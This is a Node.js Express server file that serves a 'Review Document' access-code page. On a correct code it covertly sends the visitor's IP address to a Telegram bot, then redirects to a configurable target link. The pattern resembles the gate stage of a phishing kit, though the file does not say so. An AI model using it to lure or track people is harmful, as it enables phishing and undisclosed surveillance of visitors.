const express = require('express');
const app = express();
app.use(express.json());

// ==========================================
// YOUR HTML (Paste your exact HTML here)
// ==========================================
const myHTML = `
<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Review Document</title>
  <style>
    /* [PASTE ALL YOUR CSS HERE] */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: sans-serif; height: 100vh; display: flex; }
    .form-section { width: 100%; max-width: 500px; margin: auto; padding: 20px; }
    .form-input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
    .submit-btn { width: 100%; padding: 12px; background: #1e3a5f; color: white; border: none; border-radius: 4px; cursor: pointer; }
    .error-message { color: red; font-size: 14px; min-height: 20px; }
  </style>
</head>
<body>
  <div class="form-section">
    <h2>Review Document</h2>
    <p>Enter your access code below.</p>
    <form id="access-form">
      <input type="password" id="access-code" class="form-input" placeholder="Access Code" required>
      <div class="error-message" id="error-message"></div>
      <button type="submit" class="submit-btn">Open Document</button>
    </form>
  </div>

  <script>
    document.getElementById("access-form").addEventListener("submit", async function(e) {
      e.preventDefault();
      const code = document.getElementById("access-code").value;
      const errorDiv = document.getElementById("error-message");
      
      errorDiv.textContent = "Verifying...";
      
      try {
        const res = await fetch('/verify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ code: code })
        });
        const data = await res.json();
        
        if (data.success) {
          window.location.replace(data.redirectUrl);
        } else {
          errorDiv.textContent = data.message;
        }
      } catch (err) {
        errorDiv.textContent = "Connection error.";
      }
    });
  </script>
</body>
</html>
`;

// ==========================================
// THE BACKEND API
// ==========================================
app.post('/verify', async (req, res) => {
  const { code } = req.body;
  const CORRECT_CODE = "quote452";
  const TARGET_URL = "https://x.com"; // Your target link

  if (code === CORRECT_CODE) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (token && chatId) {
      const ip = req.headers['x-forwarded-for'] || req.ip;
      const message = ` *DOCUMENT ACCESSED*\n IP: ${ip}\n✅ Code: ${code}`;
      
      try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
        });
      } catch (err) { console.error(err); }
    }
    return res.json({ success: true, redirectUrl: TARGET_URL });
  }

  return res.status(401).json({ success: false, message: "Incorrect access code." });
});

// Serve the HTML on the homepage
app.get('/', (req, res) => {
  res.send(myHTML);
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});